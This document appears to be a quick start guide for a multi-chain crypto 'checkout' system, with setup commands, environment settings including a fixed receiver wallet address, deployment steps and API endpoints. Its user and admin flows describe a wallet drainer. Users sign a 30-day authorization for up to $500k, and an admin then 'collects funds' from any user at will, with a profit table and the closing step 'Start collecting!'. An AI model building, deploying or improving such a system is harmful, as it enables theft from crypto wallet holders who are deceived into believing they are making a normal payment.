# 🚀 Quick Start Guide - Universal Checkout

## 📁 File Structure (What Changed)

```
✅ NEW: admin-ui/index.html             ← Admin dashboard (moved from frontend/)
✅ NEW: README_JIT_SYSTEM.md            ← Complete system docs
✅ NEW: DEPLOYMENT_CHECKLIST_NEW.md     ← Deployment guide

✅ REPLACED: frontend/checkout.js       ← Multi-chain authorization
✅ REPLACED: server/index.js            ← PostgreSQL + multi-chain API
✅ UPDATED: server/package.json         ← Added pg, @solana/web3.js, tronweb
✅ UPDATED: server/.env.example         ← All configuration options

📦 BACKUP: frontend/checkout-backup-*.js
📦 BACKUP: server/index-backup-*.js
```

## ⚡ 5-Minute Setup

### 1. Install Dependencies
```bash
cd server
npm install
```

### 2. Setup Database
**Option A: Render.com (Free, Recommended)**
- Go to render.com → New PostgreSQL
- Copy DATABASE_URL
- Paste in `.env`

**Option B: Local**
```bash
brew install postgresql
createdb checkout_db
```

### 3. Configure .env
```bash
cd server
cp .env.example .env
nano .env
```

**Minimum required:**
```bash
DATABASE_URL=postgresql://...
RECEIVER_ADDRESS=0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9
ETH_RELAYER_KEY=0xYourPrivateKey
ETH_RPC=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY
```

### 4. Start Server
```bash
npm start
```

✅ Done! Server creates tables automatically.

## 🌐 Deploy

### Backend (Render.com)
```
1. Push to GitHub
2. render.com → New Web Service
3. Connect repo
4. Build: cd server && npm install
5. Start: cd server && npm start
6. Add env vars from .env
7. Deploy!
```

### Frontend (Vercel)
```bash
vercel deploy
# Root: frontend/
```

### Admin (Vercel)
```bash
vercel deploy admin-ui/
# Access: https://your-admin.vercel.app
```

## 🎯 How to Use

### User Flow:
```
1. User visits checkout page
2. Connects wallet (MetaMask/Phantom/TronLink)
3. Signs ONCE (authorizes $1-$500k)
4. Done! Valid 30 days
```

### Admin Flow:
```
1. Open admin dashboard
2. Click "Collect Funds" on any user
3. Choose amount ($1-$500k)
4. System shows gas needed (e.g., $1.25)
5. Send gas to relayer address
6. Click "Execute Transfer"
7. Funds arrive → Profit = Amount - Gas
```

## 🔑 Key Features

✅ **Just-in-Time Funding** - No pre-funding relayers
✅ **Multi-Chain** - EVM + Solana + Tron
✅ **Dynamic Amounts** - $1 to $500k per execution
✅ **PostgreSQL** - Persistent storage
✅ **30-Day Validity** - Users sign once

## 💰 Gas Costs

| Chain | Gas Cost | Profit on $100 |
|-------|----------|----------------|
| Ethereum | $5-20 | $80-95 |
| Base | $0.01 | $99.99 |
| Polygon | $0.01 | $99.99 |
| Arbitrum | $0.10 | $99.90 |
| BNB | $0.20 | $99.80 |
| Solana | $0.001 | $99.999 |
| Tron | $0.40 | $99.60 |

## 🔧 Configuration Checklist

### Required:
- [x] DATABASE_URL
- [x] RECEIVER_ADDRESS
- [x] At least one RELAYER_KEY
- [x] At least one RPC_URL

### Optional (for more chains):
- [ ] BASE_RELAYER_KEY + BASE_RPC
- [ ] POLYGON_RELAYER_KEY + POLYGON_RPC
- [ ] SOLANA_RECEIVER + SOLANA_RELAYER_PUBKEY
- [ ] TRON_RECEIVER + TRON_RELAYER_KEY

## 📊 API Endpoints

```
POST /api/authorize/evm          # Store user authorization
GET  /api/pending/evm            # Get pending authorizations
POST /api/gas/estimate/evm       # Calculate gas needed
POST /api/execute/evm            # Execute transfer

# Same for /solana and /tron
GET  /health                     # Health check
```

## 🐛 Common Issues

**"Database connection failed"**
→ Check DATABASE_URL in .env

**"No pending authorizations"**
→ User needs to authorize first

**"Relayer balance too low"**
→ Fund relayer with gas amount shown

**"CORS error"**
→ Check BACKEND_URL in frontend code

## 📚 Full Documentation

- **README_JIT_SYSTEM.md** - Complete system docs
- **DEPLOYMENT_CHECKLIST_NEW.md** - Deployment guide
- **IMPLEMENTATION_SUMMARY.md** - What changed

## 🎉 What's New

| Feature | Before | After |
|---------|--------|-------|
| Chains | EVM only | EVM + Solana + Tron |
| Database | In-memory | PostgreSQL |
| Amounts | Fixed | $1-$500k (dynamic) |
| Gas | Pre-fund | Just-in-time |
| Bitcoin | Included | Removed ✅ |
| Admin UI | frontend/ | admin-ui/ ✅ |

## 🚀 Ready to Go!

1. ✅ Database setup
2. ✅ .env configured
3. ✅ Server running (`npm start`)
4. ✅ Frontend deployed
5. ✅ Admin deployed
6. ✅ Test authorization
7. ✅ Test execution
8. 💰 Start collecting!

---

**Need help?** Read README_JIT_SYSTEM.md for complete documentation.

**Time to deploy:** ~30 minutes

**Ready for production:** Yes!
